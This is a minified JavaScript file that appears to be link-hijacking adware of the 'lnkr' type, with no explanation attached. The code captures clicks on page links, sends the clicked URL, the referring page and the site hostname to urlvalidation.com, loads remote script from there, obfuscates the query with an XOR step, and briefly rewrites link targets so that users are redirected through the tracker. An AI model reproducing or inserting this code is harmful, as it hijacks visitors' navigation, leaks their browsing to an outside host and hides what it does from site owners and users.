(function(r){var c="urlvalidation.com";var e=(location.protocol=="https:"?"https:":"http:")+"//urlvalidation.com/api/js-get?sourceId=5";var j=(location.protocol=="https:"?"https:":"http:")+"//urlvalidation.com/get?sourceId=5";var p="";var v=100;var B=[];var J=Boolean(document.attachEvent);var o=true;var C=false;var A=null;var q=true;var l=null;var G=H(document.location.hostname);r._lnkr5=r._lnkr5||{};if(_lnkr5.excludeDomains){for(var D in _lnkr5.excludeDomains){B.push(_lnkr5.excludeDomains[D])}}if(_lnkr5.uid){p=_lnkr5.uid}if(typeof _lnkr5.allowTargetBlank!="undefined"){q=(_lnkr5.allowTargetBlank)}if(typeof _lnkr5.host!="undefined"){l=(_lnkr5.host)}if(p){e+="&uid="+encodeURIComponent(p);j+="&uid="+encodeURIComponent(p)}j+="&format=go";var I="__lfcc";function y(L,M,N){var i="";if(N){var K=new Date();K.setTime(K.getTime()+(N*1000));i="; expires="+K.toGMTString()}document.cookie=L+"="+M+i+"; path=/"}function b(L){var N=L+"=";var K=document.cookie.split(";");for(var M=0;M<K.length;M++){var O=K[M];while(O.charAt(0)==" "){O=O.substring(1,O.length)}if(O.indexOf(N)==0){return O.substring(N.length,O.length)}}return null}function m(i){return(i+"").replace(/([.?*+^$[\]\\(){}|-])/g,"\\$1")}function a(i){return i.replace(/^\s+|\s+$/g,"")}function F(N){var L=0,M=N.length,K="";for(;L<M;){K+=String.fromCharCode(77^N.charCodeAt(L++))}return K}function z(i){var L=i.indexOf("?");if(L<0){return i}else{var K=i.substr(L+1);i=i.substr(0,L);return i+"?a="+encodeURIComponent(F(K))}}function u(i,K,M){try{var L=i.getAttribute("href");i.setAttribute("href",K);i.setAttribute("lnkr_redirecting",true);if(!M){i.click()}else{}if(L&&L!=K){setTimeout(function(){i.setAttribute("href",L)},500)}setTimeout(function(){i.removeAttribute("lnkr_redirecting")},500)}catch(N){r.location.href=K}}function h(K,i){return Math.floor(Math.random()*(i-K+1))+K}function H(i){return i.toLowerCase().replace(/^www\./,"").replace(/:.*$/,"")}function E(P,O){var N=P.split(".");var L=O.split(".");if(N&&N.length&&L&&L.length){N.reverse();L.reverse();var M=(N.length>L.length)?L.length:N.length;var Q=1;for(var K=0;K<M;K++){if(Q>3){break}if(!N[K]||!L[K]||N[K]!=L[K]){return false}Q++}return true}return false}function t(R){A=null;var O,S,M,K;if(O=R.href.match(/^[^\?]+\?(.+)/)){var Q=O[1];if(Q){var L=Q.split("&");if(L&&L.length){for(var N=0;N<L.length;N++){var T=L[N].split("=");S=decodeURIComponent(T[1]);if(!/^https?:/i.test(S)){S=null}}}}}if(O=R.href.match(/^[^?]+(https?:\/\/.+)/)){S=O[1]}if(S){var P=H(R.hostname);M=document.createElement("a");M.href=S;K=H(M.hostname);if(!E(K,P)&&!E(K,G)){A=S;return true}else{return false}}return null}function s(K){if(!K.hostname||!/^https?:$/i.test(K.protocol)||-1!==K.className.indexOf("jq-aff-off")){return false}if(!q&&K.target&&K.target=="_blank"){return false}if(null!=K.getAttribute("onclick")&&""!=K.getAttribute("onclick")&&""==document.referrer){return false}if(o){var N=t(K);if(null!==N){return N}}var O=/\.(jpg|png|jpeg|gif|bmp|doc|pdf|xls)$/;if(K.pathname&&K.pathname.match(O)){return false}if(typeof B!=="undefined"&&B!=""&&B.length){for(var M=0;M<B.length;M++){if(B[M]==""){continue}var L=new RegExp(m(a(B[M])));if(K.hostname.match(L)){return false}}}return(H(K.hostname)!=G||(!r._lnkr_nt_active&&""==document.referrer))}function n(i){if(!i.hostname){return false}return(H(i.hostname)==G||H(i.hostname).indexOf(G)>-1||G.indexOf(H(i.hostname))>-1)&&""==document.referrer}function g(i){if(J){i=i||r.event}if("which" in i&&3==i.which||"button" in i&&2==i.button){return}if(!k(i)){if(J){i.returnValue=false}else{i.preventDefault()}}}function k(i){var M=(J)?"srcElement":"target";var P,O=i[M];do{try{P=O.nodeType}catch(N){break}if(1===P&&(Q=O.tagName.toUpperCase(),"A"===Q||"AREA"===Q)){var R=i.ctrlKey||i.metaKey||i.altKey||i.shiftKey,L=i.which&&1===i.which||0===i.button,Q=O;if(!(Q&&!R&&L&&s(Q))){return true}if(Q.getAttribute("lnkr_redirecting")){return true}if(Q.getAttribute("data-ad-flag")){return true}if(s(O)){if(n(O)){var K=b(I);if(K==1){return true}}if(Q.target&&Q.target=="_blank"){f(i,O);return true}else{if(w(i,O)!==true){return false}}}}O=O.parentNode}while(O);return true}function x(L){var K=document.getElementsByTagName("head")[0]||document.documentElement;var i=document.createElement("script");i.type="text/javascript";i.async=true;i.src=L;K.insertBefore(i,K.firstChild)}function w(N,i){var M=h(1,93435);var L="__lncc_"+i.hostname;if(b(L)==1){return true}r["func"+M]=(function(){return function(R){if(R){try{if(r.__lr_fic){y(I,1,86400)}else{y(L,1,1800)}}catch(S){}clearTimeout(P);u(i,R)}}})();var K=i.href;if(location.hostname.indexOf("google")>=-1){var O=i.getAttribute("data-href");if(O){K=O}}var Q=e+"&stub="+M;if(C&&l){Q+="&host="+l}if(o&&null!==A){Q+="&out="+encodeURIComponent(A);Q+="&originalUrl="+encodeURIComponent(K);Q+="&documentHostname="+encodeURIComponent(G)}else{Q+="&out="+encodeURIComponent(K)}if(n(i)){Q+="&fic=1";r.__lr_fic=1}x(z(Q));var P=setTimeout(function(){u(i,K)},3000)}function f(L,i){var K=i.href;var N="_lnkr_blnck_"+i.hostname;var M=j;if(C&&l){M+="&host="+l}var P=b(N);if(P==1){return true}if(location.hostname.indexOf("google")>=-1){var O=i.getAttribute("data-href");if(O){K=O}}if(o&&null!==A){M+="&out="+encodeURIComponent(A);M+="&originalUrl="+encodeURIComponent(K);M+="&documentHostname="+encodeURIComponent(G)}else{M+="&out="+encodeURIComponent(K)}M+="&ref="+encodeURIComponent(location.href);if(n(i)){M+="&fic=1";r.__lr_fic=1}y(N,1,3600);u(i,z(M),true)}var d=function(){if(document.attachEvent){document.attachEvent("onclick",g)}else{if(document.addEventListener){document.addEventListener("click",g,false)}}};if(typeof v!=="undefined"&&v<100){if(h(1,99)>=v){return}}d()})(window);